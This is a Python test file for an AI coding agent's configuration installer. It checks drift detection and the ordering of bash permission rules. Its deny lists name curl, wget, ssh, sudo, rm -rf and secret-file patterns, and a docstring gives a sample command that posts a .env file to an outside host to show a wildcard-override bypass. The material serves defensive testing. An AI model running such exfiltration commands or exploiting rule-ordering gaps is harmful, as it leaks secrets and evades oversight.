#!/usr/bin/env python3
"""Tests for adapters/opencode/install.py — the drift logic behind `--check`.

`--check` exists because a hand-edit to the generated config used to be invisible: the
old check compared symlinks only. These tests must prove the new logic CATCHES a changed,
missing, or extra key — a guard that only ever reports clean is worse than none, because
it is trusted. The last test reproduces the exact failure the handoff named: one key
corrupted by hand must be reported by name.
"""
from __future__ import annotations

import importlib.util
import json
import os
import re
import tempfile
import unittest
from pathlib import Path

SCRIPT = (Path(__file__).resolve().parent.parent.parent
          / "adapters" / "opencode" / "install.py")


def load_module():
    spec = importlib.util.spec_from_file_location("install", SCRIPT)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


M = load_module()

MACHINE = {
    "machine": "test",
    "repo_root": "/tmp/repo",
    "harness_models": {"code": "a/b"},
    "enabled_providers": ["a"],
    "default_model": "a/b",
    "extra_allowed_paths": [],
}


class TestNameDiffs(unittest.TestCase):
    def test_identical_is_empty(self):
        self.assertEqual(M.name_diffs({"a": 1, "b": {"c": 2}}, {"a": 1, "b": {"c": 2}}), [])

    def test_changed_leaf_is_named(self):
        self.assertEqual(M.name_diffs({"a": {"b": 1}}, {"a": {"b": 2}}), ["a.b"])

    def test_missing_key_is_named(self):
        self.assertEqual(M.name_diffs({"a": 1}, {}), ["a (missing)"])

    def test_extra_key_is_named_as_removable(self):
        out = M.name_diffs({"a": 1}, {"a": 1, "b": 2})
        self.assertEqual(len(out), 1)
        self.assertTrue(out[0].startswith("b (extra"), out)

    def test_type_mismatch_is_named_at_the_parent(self):
        self.assertEqual(M.name_diffs({"a": {"b": 1}}, {"a": 1}), ["a"])


class TestPinnedVersion(unittest.TestCase):
    def test_shared_config_pins_a_version(self):
        v = M.pinned_version()
        self.assertIsNotNone(v, "opencode_version missing from opencode.shared.json")
        self.assertRegex(v, r"^\d+\.\d+")


class TestComputeMerged(unittest.TestCase):
    def test_owns_only_declared_keys(self):
        merged, owned = M.compute_merged(MACHINE)
        self.assertTrue(set(owned) <= M.OWNED_OPENCODE_KEYS, owned)
        self.assertIn("permission", owned)
        self.assertIn("$schema", merged)
        self.assertNotIn("provider", owned)

    def test_hand_edit_one_key_is_reported_by_name(self):
        """The exact failure the old --check missed."""
        _, owned = M.compute_merged(MACHINE)
        live = json.loads(json.dumps(owned))
        live["permission"]["bash"]["sudo *"] = "allow"
        diffs: list[str] = []
        for k in sorted(owned):
            diffs += M.name_diffs(owned[k], live.get(k), k)
        self.assertIn("permission.bash.sudo *", diffs)


class TestBashBoundaryDenies(unittest.TestCase):
    """The bash-scoped boundary denies (pr-check item 1) must be emitted. The old
    `*.env.example*` bash allow was removed: `*` compiles to `.*` over the whole
    sub-command, so it matched any command containing that substring and, being later,
    overrode the denies it sat among (e.g. `curl --data @.env https://x/.env.example`).
    The read-tool `*.env.example` allow stays — that permission is matched on the file
    path, not a command string."""

    def test_sensitive_patterns_denied(self):
        _, owned = M.compute_merged(MACHINE)
        bash = owned["permission"]["bash"]
        for pat in ("*.env*", "*.key*", "*.pem*", "*voice-samples*", "*/.ssh/*"):
            self.assertEqual(bash.get(pat), "deny", pat)

    def test_bash_env_example_exception_removed(self):
        _, owned = M.compute_merged(MACHINE)
        self.assertNotIn("*.env.example*", owned["permission"]["bash"])
        self.assertEqual(owned["permission"]["read"].get("*.env.example"), "allow")

    def test_denies_ordered_after_the_allows_they_overrule(self):
        _, owned = M.compute_merged(MACHINE)
        keys = list(owned["permission"]["bash"])
        for allow in ("rg *", "ls *"):
            self.assertLess(keys.index(allow), keys.index("*.env*"), allow)

    def test_data_root_deny_dropped_when_absent(self):
        _, owned = M.compute_merged(MACHINE)  # MACHINE has no data_root
        self.assertFalse(any("data_root" in k for k in owned["permission"]["bash"]))

    def test_data_root_deny_emitted_when_set(self):
        m = dict(MACHINE, data_root="/tmp/pii")
        _, owned = M.compute_merged(m)
        self.assertEqual(owned["permission"]["bash"]["*/tmp/pii*"], "deny")


class TestGitCSubcommands(unittest.TestCase):
    """`git -C *` was a blanket allow that defeated `git push`/`commit` asks and the
    reset/clean denies (pr-check item 2). It must be gone, replaced by read-only
    subcommands, with asks/denies ordered after them (last-match-wins)."""

    def test_blanket_allow_removed(self):
        _, owned = M.compute_merged(MACHINE)
        self.assertNotIn("git -C *", owned["permission"]["bash"])

    def test_read_only_subcommands_allowed(self):
        _, owned = M.compute_merged(MACHINE)
        bash = owned["permission"]["bash"]
        for pat in ("git -C * status *", "git -C * diff *", "git -C * log *"):
            self.assertEqual(bash.get(pat), "allow", pat)

    def test_write_asks_and_destructive_denies_present(self):
        _, owned = M.compute_merged(MACHINE)
        bash = owned["permission"]["bash"]
        self.assertEqual(bash.get("git -C * push *"), "ask")
        self.assertEqual(bash.get("git -C * commit *"), "ask")
        self.assertEqual(bash.get("git -C * reset *"), "deny")
        self.assertEqual(bash.get("git -C * clean *"), "deny")

    def test_asks_and_denies_ordered_after_read_only_allows(self):
        _, owned = M.compute_merged(MACHINE)
        keys = list(owned["permission"]["bash"])
        self.assertLess(keys.index("git -C * status *"), keys.index("git -C * push *"))
        self.assertLess(keys.index("git -C * status *"), keys.index("git -C * reset *"))


class TestAgentProfilesPortable(unittest.TestCase):
    """Agent permission rules merge LAST and win, so a machine path or a trailing
    boundary deny in a profile breaks every other machine (pr-check item 4)."""

    def test_no_machine_paths_or_boundary_blocks(self):
        agents = sorted((SCRIPT.parent / "agents").glob("*.md"))
        self.assertTrue(agents, "no agent profiles found")
        for a in agents:
            body = a.read_text(encoding="utf-8")
            self.assertNotIn("/Users/", body, f"{a.name} hardcodes a machine path")
            self.assertNotIn("external_directory", body, f"{a.name} re-declares the boundary")


class TestBuildFastLane(unittest.TestCase):
    """The build profile widens mechanical commands, but must never carry a
    catch-all allow: agent rules merge LAST, so a trailing '*' would override the
    global ssh/sudo denies and fail OPEN (trap #2/#7). `find` is not allowlisted —
    `find * -exec`/`-delete` is arbitrary mutation, not a read."""

    def test_build_mechanical_allows_present(self):
        _, owned = M.compute_merged(MACHINE)
        bash = owned["agent"]["build"]["permission"]["bash"]
        for pat in ("mkdir *", "cp *", "mv *", "jq *", "node --check *"):
            self.assertEqual(bash.get(pat), "allow", pat)

    def test_no_catch_all_in_build(self):
        _, owned = M.compute_merged(MACHINE)
        self.assertNotIn("*", owned["agent"]["build"]["permission"]["bash"])

    def test_sed_in_place_denied_after_the_allow(self):
        _, owned = M.compute_merged(MACHINE)
        bash = owned["agent"]["build"]["permission"]["bash"]
        keys = list(bash)
        self.assertEqual(bash["sed -i *"], "deny")
        self.assertLess(keys.index("sed *"), keys.index("sed -i *"))

    def test_find_is_not_allowlisted(self):
        _, owned = M.compute_merged(MACHINE)
        bash = owned["agent"]["build"]["permission"]["bash"]
        self.assertFalse(any(k.startswith("find ") for k in bash))


class TestRemovedOwnedKey(unittest.TestCase):
    """A key install.py owns but machine.json no longer specifies is normally REMOVED,
    not preserved (pr-check #6a). Exception: `enabled_providers` is preserved when
    absent, because deleting a provider allow-list widens access (fail open); and
    `enabled_providers: []` is an explicit deny-all, not "absent"."""

    def test_removed_owned_key_is_dropped_and_non_owned_kept(self):
        m = {k: v for k, v in MACHINE.items() if k != "default_model"}
        live = {"model": "old/model", "keep_me": {"a": 1}}
        merged, owned = M.compute_merged(m, live)
        self.assertNotIn("model", merged)
        self.assertEqual(merged["keep_me"], {"a": 1})

    def test_absent_provider_control_is_preserved_fail_closed(self):
        m = {k: v for k, v in MACHINE.items() if k != "enabled_providers"}
        live = {"enabled_providers": ["openrouter"]}
        merged, owned = M.compute_merged(m, live)
        self.assertEqual(merged.get("enabled_providers"), ["openrouter"],
                         "removing the provider allow-list on absence fails open")

    def test_empty_provider_control_is_emitted_as_deny_all(self):
        m = dict(MACHINE, enabled_providers=[])
        _, owned = M.compute_merged(m)
        self.assertEqual(owned["enabled_providers"], [])


class TestCheckSymlinksRoots(unittest.TestCase):
    """A live symlink pointing INTO our source tree but absent from it is stale (a
    removed/excluded skill, a hand-added link) and must be reported; one pointing
    elsewhere (e.g. ~/agent/skills) is not ours and must not be (pr-check #6b)."""

    def test_stale_reported_foreign_ignored(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            src = root / "src"
            (src / "keep").mkdir(parents=True)
            (src / "keep" / "SKILL.md").write_text("x", encoding="utf-8")
            live = root / "live"
            live.mkdir()
            os.symlink(src / "keep", live / "keep")     # in sync
            os.symlink(src / "gone", live / "gone")     # stale: points into src
            foreign = root / "foreign"
            foreign.mkdir()
            os.symlink(foreign, live / "other")         # not ours
            n, problems = M.check_symlinks_roots([("skills", live, src)])
            self.assertEqual(n, 1, problems)
            self.assertTrue(any("gone" in p for p in problems), problems)
            self.assertFalse(any("other" in p for p in problems), problems)


class TestPhaseCheck(unittest.TestCase):
    """test_install never exercised phase_check, so a regression back to symlink-only
    checking would pass green (review should-fix). These call it against a temp HOME."""

    def _run(self, live_cfg, live_settings, machine=MACHINE):
        with tempfile.TemporaryDirectory() as td:
            home = Path(td)
            (home / "opencode.json").write_text(json.dumps(live_cfg), encoding="utf-8")
            (home / "settings.json").write_text(json.dumps(live_settings), encoding="utf-8")
            saved = (M.OPENCODE_HOME, M.CLAUDE_HOME, M.probe_opencode_version, M.check_symlinks)
            M.OPENCODE_HOME = M.CLAUDE_HOME = home
            M.probe_opencode_version = lambda: M.pinned_version()
            M.check_symlinks = lambda: (0, [])
            try:
                return M.phase_check(machine)
            finally:
                (M.OPENCODE_HOME, M.CLAUDE_HOME,
                 M.probe_opencode_version, M.check_symlinks) = saved

    def test_clean_config_is_zero(self):
        _, owned = M.compute_merged(MACHINE)
        rc = self._run(owned, {"env": {"AGENT_TOOLING_ROOT": str(M.REPO_ROOT / "agent-tooling")}})
        self.assertEqual(rc, 0)

    def test_hand_edited_key_is_reported(self):
        _, owned = M.compute_merged(MACHINE)
        broken = json.loads(json.dumps(owned))
        broken["permission"]["bash"]["sudo *"] = "allow"
        rc = self._run(broken, {"env": {"AGENT_TOOLING_ROOT": str(M.REPO_ROOT / "agent-tooling")}})
        self.assertEqual(rc, 1)

    def test_extra_owned_key_absent_from_machine_is_reported(self):
        _, owned = M.compute_merged(MACHINE)
        live = json.loads(json.dumps(owned))
        live["enabled_providers"] = ["stale"]          # machine.json dropped it
        m = {k: v for k, v in MACHINE.items() if k != "enabled_providers"}
        rc = self._run(live, {"env": {"AGENT_TOOLING_ROOT": str(M.REPO_ROOT / "agent-tooling")}}, m)
        self.assertEqual(rc, 1)


class TestPhaseDeployGate(unittest.TestCase):
    """phase_deploy must parse BOTH opencode.json and settings.json before it writes
    either. The historical bug: an unparseable settings.json crashed AFTER opencode.json
    had already been overwritten, leaving a half-deploy that reports as done. The review
    flagged this gate as read-only verified; these tests make it executable."""

    OC_ORIGINAL = '{"marker": "original"}'

    def _deploy(self, oc_text, cs_text, expect_exit=None, jsonc_text=None):
        td = tempfile.TemporaryDirectory()
        self.addCleanup(td.cleanup)
        home = Path(td.name)
        opencode, claude = home / "opencode", home / "claude"
        opencode.mkdir()
        claude.mkdir()
        oc, cs = opencode / "opencode.json", claude / "settings.json"
        oc.write_text(oc_text, encoding="utf-8")
        cs.write_text(cs_text, encoding="utf-8")
        if jsonc_text is not None:
            (opencode / "opencode.jsonc").write_text(jsonc_text, encoding="utf-8")
        saved = (M.OPENCODE_HOME, M.CLAUDE_HOME, M.assert_version, M.HERE, M.SKILLS_SRC)
        M.OPENCODE_HOME, M.CLAUDE_HOME = opencode, claude
        M.assert_version = lambda: None
        M.HERE = home / "adapter"        # no agents/ or plugins/ -> SKIP
        M.SKILLS_SRC = home / "skills"   # absent -> SKIP
        try:
            if expect_exit is None:
                M.phase_deploy(MACHINE, dry=False, batch=False)
                code = None
            else:
                with self.assertRaises(SystemExit) as cm:
                    M.phase_deploy(MACHINE, dry=False, batch=False)
                code = cm.exception.code
        finally:
            (M.OPENCODE_HOME, M.CLAUDE_HOME, M.assert_version, M.HERE, M.SKILLS_SRC) = saved
        return code, home

    def test_unparseable_settings_leaves_opencode_untouched(self):
        """The exact half-deploy the gate prevents: opencode.json must NOT be rewritten
        when settings.json cannot be parsed."""
        code, home = self._deploy(self.OC_ORIGINAL, "{ this is not json", expect_exit=2)
        self.assertEqual(code, 2)
        oc = home / "opencode" / "opencode.json"
        self.assertEqual(json.loads(oc.read_text(encoding="utf-8")), {"marker": "original"})

    def test_unparseable_opencode_leaves_settings_untouched(self):
        code, home = self._deploy("{ not valid json", "{}", expect_exit=2)
        self.assertEqual(code, 2)
        self.assertEqual((home / "claude" / "settings.json").read_text(encoding="utf-8"), "{}")

    def test_both_parse_writes_both_configs(self):
        code, home = self._deploy("{}", "{}")
        self.assertIsNone(code)
        merged = json.loads((home / "opencode" / "opencode.json").read_text(encoding="utf-8"))
        self.assertIn("permission", merged)
        written = json.loads((home / "claude" / "settings.json").read_text(encoding="utf-8"))
        self.assertEqual(written["env"]["AGENT_TOOLING_ROOT"],
                         str(M.REPO_ROOT / "agent-tooling"))

    def test_shadowing_jsonc_removed_before_the_write(self):
        """A stale opencode.jsonc merges OVER the generated opencode.json, so deploy must
        remove it first — otherwise the file it writes is silently overridden."""
        code, home = self._deploy(
            "{}", "{}",
            jsonc_text='{"permission": {"bash": {"rm *": "allow"}}}')
        self.assertIsNone(code)
        self.assertFalse((home / "opencode" / "opencode.jsonc").exists())
        merged = json.loads((home / "opencode" / "opencode.json").read_text(encoding="utf-8"))
        self.assertIn("permission", merged)


class TestBuildProfileDenyOrdering(unittest.TestCase):
    """Agent rules merge AFTER the global `user` rules and evaluate is findLast, so a
    build allow placed after a deny overrides it (source: agent/agent.ts + permission/
    index.ts @ v1.18.30). Every allow must precede the deny block."""

    def test_build_edit_allowed(self):
        _, owned = M.compute_merged(MACHINE)
        self.assertEqual(owned["agent"]["build"]["permission"]["edit"], "allow")

    def test_no_allow_after_the_last_deny(self):
        _, owned = M.compute_merged(MACHINE)
        bash = owned["agent"]["build"]["permission"]["bash"]
        items = list(bash.items())
        denies = [i for i, (_, v) in enumerate(items) if v == "deny"]
        self.assertTrue(denies, "build profile has no denies; the boundary is unenforced")
        after = [k for k, v in items[max(denies) + 1:] if v == "allow"]
        self.assertEqual(after, [], f"build allows after the last deny override it: {after}")

    def test_boundary_denies_repeated_in_build(self):
        _, owned = M.compute_merged(dict(MACHINE, data_root="/tmp/pii"))
        bash = owned["agent"]["build"]["permission"]["bash"]
        for pat in ("sudo *", "ssh *", "scp *", "curl *", "wget *", "rm -rf *",
                    "*.env*", "*.key*", "*.pem*", "*id_rsa*", "*id_ed25519*",
                    "*/.ssh/*", "*voice-samples*", "*/tmp/pii*"):
            self.assertEqual(bash.get(pat), "deny", pat)


class TestNoWildcardBashAllow(unittest.TestCase):
    """A bash allow whose pattern begins with '*' compiles to '.*…' over the whole
    sub-command and matches any command containing that substring, overriding the deny it
    was meant to except (wildcard.ts: anchored, '*' -> '.*', dotAll). No bash allow,
    global or per-agent, may begin with '*'. ``*.env.example*`` was exactly this bug."""

    def _wildcard_allows(self, bash: dict) -> list[str]:
        return [k for k, v in bash.items() if v == "allow" and k.startswith("*")]

    def test_global_bash_has_no_wildcard_allow(self):
        _, owned = M.compute_merged(MACHINE)
        bad = self._wildcard_allows(owned["permission"]["bash"])
        self.assertEqual(bad, [], f"global bash wildcard allows: {bad}")

    def test_agent_bash_has_no_wildcard_allow(self):
        _, owned = M.compute_merged(MACHINE)
        for name, agent in owned.get("agent", {}).items():
            bash = (agent.get("permission") or {}).get("bash") or {}
            bad = self._wildcard_allows(bash)
            self.assertEqual(bad, [], f"agent `{name}` bash wildcard allows: {bad}")

    def test_agent_profile_frontmatter_has_no_wildcard_bash_allow(self):
        agents = sorted((SCRIPT.parent / "agents").glob("*.md"))
        self.assertTrue(agents, "no agent profiles found")
        key = re.compile(r'^\s+"?(\*[^":]*)"?\s*:\s*allow\s*$', re.MULTILINE)
        for a in agents:
            text = a.read_text(encoding="utf-8")
            frontmatter = text.split("---", 2)[1] if text.startswith("---") else ""
            self.assertFalse(key.search(frontmatter), f"{a.name} has a '*'-prefixed allow")

    def test_read_exception_kept_and_bash_exception_removed(self):
        _, owned = M.compute_merged(MACHINE)
        self.assertEqual(owned["permission"]["read"].get("*.env.example"), "allow")
        self.assertNotIn("*.env.example*", owned["permission"]["bash"])


if __name__ == "__main__":
    unittest.main()
